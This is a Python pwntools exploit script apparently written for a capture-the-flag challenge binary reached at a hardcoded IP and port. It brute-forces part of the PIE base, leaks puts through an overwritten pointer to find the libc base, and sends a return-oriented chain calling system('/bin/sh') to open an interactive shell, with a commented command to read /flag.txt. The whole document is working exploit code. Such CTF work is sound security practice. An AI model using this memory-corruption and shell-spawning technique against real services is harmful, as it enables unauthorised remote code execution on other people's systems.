#!/usr/bin/env python3
from pwn import *

PORT = 45532
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB(p):
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001D81
            brva 0x00000000000012FF
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

def sla(pr, dt, p): p.sendlineafter(pr, dt)
def sa(pr, dt, p): p.sendafter(pr, dt)

def audit(p, sz, dt, wait = True):
    if wait == True:
        sla(b'-1) exit\n', b'5', p)
    else:
        p.sendline(b'5')
    sla(b'size?\n', str(sz).encode(), p)
    sa(b'note?\n', dt, p)


def leak_libc():
    while True:
        for base_low16 in range(0, 0x10000, 0x1000):
            p = conn()
            GDB(p)      
            try:
                log.info(f"trying PIE low16 {base_low16:#x}")

                puts_low = (base_low16 + elf.got.puts) & 0xffff

                pl = b"A"*0x70 + p16(puts_low)

                audit(p, 0x10060, pl)
                data = p.recvuntil(b"-1) exit")
                marker = b' 4) Probe\n'
                after_probe = data.rsplit(marker, 1)[1]
                leak_line = after_probe.split(b"\n", 1)[0]

                if len(leak_line) < 6:
                    raise EOFError("short leak")

                leak = u64(leak_line[:8].ljust(8, b"\x00"))

                libc.address = leak - libc.sym.puts

                if libc.address & 0xfff:
                    raise EOFError("bad libc")

                log.success(f"puts = {leak:#x}")
                log.success(f"libc_base = {libc.address:#x}")
                return p

            except Exception as e:
                log.failure(repr(e))
                p.close()

    raise RuntimeError("failed")

p = leak_libc()

pl = flat(
    b'A'*0x78,
    libc.address + 0x2a3e5 + 1,
    libc.address + 0x2a3e5,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )

# GDB(p)
audit(p, 0x10060, pl, False)

# p.sendline(b'cat /flag.txt')
p.interactive()